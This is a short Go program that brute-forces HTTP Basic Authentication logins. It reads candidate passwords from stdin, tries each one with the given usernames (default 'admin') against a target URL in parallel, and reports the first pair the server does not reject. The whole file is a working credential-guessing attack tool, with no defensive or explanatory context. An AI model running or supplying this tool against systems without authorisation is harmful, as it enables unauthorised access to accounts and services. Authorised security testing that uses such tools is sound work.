package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"sync"

	"github.com/unixpickle/essentials"
)

func main() {
	var rawURL string
	var usernames string
	var parallel int
	flag.StringVar(&rawURL, "url", "", "raw URL")
	flag.StringVar(&usernames, "usernames", "admin", "usernames to try (comma-separated)")
	flag.IntVar(&parallel, "parallel", 1, "number of parallel requests")
	flag.Parse()

	if rawURL == "" {
		essentials.Die("Required flag: -url. See -help.")
	}

	pairs := make(chan [2]string, 1)

	var wg sync.WaitGroup
	for i := 0; i < parallel; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for pair := range pairs {
				req, err := http.NewRequest("GET", rawURL, nil)
				essentials.Must(err)
				req.SetBasicAuth(pair[0], pair[1])
				resp, err := http.DefaultClient.Do(req)
				essentials.Must(err)
				resp.Body.Close()
				if resp.StatusCode != http.StatusUnauthorized {
					fmt.Println("Found login: " + pair[0] + ":" + pair[1])
					os.Exit(1)
				} else {
					fmt.Fprintln(os.Stderr, "Failed login: "+pair[0]+":"+pair[1]+" status:", resp.StatusCode)
				}
			}
		}()
	}

	for _, password := range readPasswords() {
		for _, username := range strings.Split(usernames, ",") {
			pairs <- [2]string{username, password}
		}
	}
	close(pairs)

	wg.Wait()
}

func readPasswords() []string {
	fmt.Println("Reading passwords from stdin...")
	data, err := ioutil.ReadAll(os.Stdin)
	essentials.Must(err)
	var res []string
	for _, line := range strings.Split(string(data), "\n") {
		res = append(res, strings.TrimRight(line, "\r"))
	}
	return res
}
